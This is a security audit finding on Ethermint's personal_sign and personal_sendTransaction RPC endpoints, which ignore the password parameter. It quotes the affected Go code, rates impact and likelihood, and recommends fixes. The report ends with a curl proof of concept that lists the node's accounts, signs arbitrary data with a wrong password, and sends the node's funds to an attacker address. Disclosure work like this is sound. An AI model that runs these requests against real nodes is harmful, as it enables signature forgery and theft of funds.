### Title
`personal_sign` and `personal_sendTransaction` Silently Discard the Password Parameter, Bypassing Caller Authentication — (`File: rpc/namespaces/ethereum/personal/api.go`)

### Summary
The `personal_sign` and `personal_sendTransaction` JSON-RPC endpoints accept a `password` parameter that, per the Ethereum JSON-RPC specification, is supposed to decrypt and authenticate the caller's right to use the requested key. Both implementations in Ethermint silently discard this parameter (`_ string`). Any HTTP client that can reach the JSON-RPC port can therefore sign arbitrary data or submit transactions from any key held in the node's keyring without supplying the correct password.

### Finding Description

The `PrivateAccountAPI` in `rpc/namespaces/ethereum/personal/api.go` exposes two sensitive operations:

**`personal_sendTransaction`** (line 131):
```go
func (api *PrivateAccountAPI) SendTransaction(
    _ context.Context, args evmtypes.TransactionArgs, _ string,
) (common.Hash, error) {
    api.logger.Debug("personal_sendTransaction", "address", args.To.String())
    return api.backend.SendTransaction(args)
}
```

**`personal_sign`** (line 145):
```go
func (api *PrivateAccountAPI) Sign(
    _ context.Context, data hexutil.Bytes, addr common.Address, _ string,
) (hexutil.Bytes, error) {
    api.logger.Debug("personal_sign", "data", data, "address", addr.String())
    return api.backend.Sign(addr, data)
}
```

In both cases the third positional parameter — the password — is explicitly blanked with `_`. The backend implementations (`rpc/backend/sign_tx.go` lines 38–126 and 129–148) proceed directly to keyring lookup and signing without any password verification step.

The analog to the external report is exact: just as the Snap's `onRpcRequest` handler accepted calls from any origin without validating the caller, Ethermint's `personal_sign` and `personal_sendTransaction` accept calls from any HTTP client without validating the supplied password. The password field is the only caller-authentication mechanism defined by the Ethereum `personal_*` API contract; discarding it removes that gate entirely.

### Impact Explanation

An attacker who can reach the JSON-RPC port (default `0.0.0.0:8545`) and who knows (or can enumerate via `personal_listAccounts`) any address held in the node's keyring can:

1. Call `personal_sign(data, address, "")` with an empty or wrong password and obtain a valid ECDSA signature over arbitrary data — including EIP-712 typed-data payloads or raw transaction hashes — using the node's private key.
2. Call `personal_sendTransaction({from: <node_address>, to: <attacker>, value: ...}, "")` to drain funds from any node-held account without knowing the password.

This is a **signer verification bypass enabling unauthorized account mutation and fund transfer**, matching the High impact category: *"Ethereum transaction… signer verification bypass enabling… forged execution, or unauthorized account/code mutation."*

### Likelihood Explanation

- The `personal` namespace must be explicitly enabled in `app.toml` (`api = "eth,txpool,personal,..."`). It is not in the minimal default set, but many operators enable it for development or tooling compatibility.
- The JSON-RPC HTTP port is bound to `0.0.0.0` by default and is frequently reachable from the internet on validator or RPC nodes.
- No exploit complexity beyond a single unauthenticated HTTP POST is required once the namespace is enabled.
- Likelihood: **Medium** (conditional on namespace being enabled, which is a common operator choice).

### Recommendation

1. **Enforce password verification** before signing. The Cosmos SDK keyring supports passphrase-protected keys; `personal_sign` and `personal_sendTransaction` should call the keyring's decrypt/unlock path with the supplied password and return an error if it fails, rather than ignoring the parameter.
2. **Restrict the `personal` namespace** to localhost-only listeners or require mutual TLS when it is enabled, consistent with how Geth treats the `personal` namespace (deprecated and localhost-only since v1.11).
3. **Emit a warning at startup** if the `personal` namespace is enabled on a non-loopback address, so operators are aware of the exposure.

### Proof of Concept

```bash
# 1. Enumerate node-held accounts (no auth required)
curl -s -X POST http://<node>:8545 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"personal_listAccounts","params":[],"id":1}'
# Returns: {"result":["0xABCD...",...]}

# 2. Sign arbitrary data with a wrong/empty password — succeeds
curl -s -X POST http://<node>:8545 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"personal_sign",
       "params":["0xdeadbeef","0xABCD...","WRONG_PASSWORD"],"id":2}'
# Returns a valid 65-byte signature — password was never checked

# 3. Send a transaction draining the node account — no password needed
curl -s -X POST http://<node>:8545 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"personal_sendTransaction",
       "params":[{"from":"0xABCD...","to":"0xATTACKER","value":"0x..."},""],"id":3}'
# Transaction is signed and broadcast; funds transferred
```

func (b *Backend) SendTransaction(args evmtypes.TransactionArgs) (common.Hash, error) {
	// Look up the wallet containing the requested signer
	_, err := b.clientCtx.Keyring.KeyByAddress(sdk.AccAddress(args.GetFrom().Bytes()))
	if err != nil {
		b.logger.Error("failed to find key in keyring", "address", args.GetFrom(), "error", err.Error())
		return common.Hash{}, fmt.Errorf("failed to find key in the node's keyring; %s; %s", keystore.ErrNoMatch, err.Error())
	}

	if args.ChainID != nil && (b.chainID).Cmp((*big.Int)(args.ChainID)) != 0 {
		return common.Hash{}, fmt.Errorf("chainId does not match node's (have=%v, want=%v)", args.ChainID, (*hexutil.Big)(b.chainID))
	}

	args, err = b.SetTxDefaults(args)
	if err != nil {
		return common.Hash{}, err
	}

	msg := args.ToTransaction()
	if err := msg.ValidateBasic(); err != nil {
		b.logger.Debug("tx failed basic validation", "error", err.Error())
		return common.Hash{}, err
	}

	bn, err := b.BlockNumber()
	if err != nil {
		b.logger.Debug("failed to fetch latest block number", "error", err.Error())
		return common.Hash{}, err
	}

	header, err := b.CurrentHeader()
	if err != nil {
		b.logger.Debug("failed to fetch latest block header", "error", err.Error())
		return common.Hash{}, err
	}

	signer := ethtypes.MakeSigner(b.ChainConfig(), new(big.Int).SetUint64(uint64(bn)), header.Time)

	// Sign transaction
	if err := msg.Sign(signer, b.clientCtx.Keyring); err != nil {
		b.logger.Debug("failed to sign tx", "error", err.Error())
		return common.Hash{}, err
	}

func (b *Backend) Sign(address common.Address, data hexutil.Bytes) (hexutil.Bytes, error) {
	from := sdk.AccAddress(address.Bytes())

	_, err := b.clientCtx.Keyring.KeyByAddress(from)
	if err != nil {
		b.logger.Error("failed to find key in keyring", "address", address.String())
		return nil, fmt.Errorf("%s; %s", keystore.ErrNoMatch, err.Error())
	}

	// Apply EIP-191 signed-message prefix to domain-separate personal
	// signatures from transaction signatures (matching Geth's eth_sign).
	signature, _, err := b.clientCtx.Keyring.SignByAddress(from, accounts.TextHash(data), signingtypes.SignMode_SIGN_MODE_TEXTUAL)
	if err != nil {
		b.logger.Error("keyring.SignByAddress failed", "address", address.Hex())
		return nil, err
	}

	signature[crypto.RecoveryIDOffset] += 27 // Transform V from 0/1 to 27/28 according to the yellow paper
	return signature, nil
}
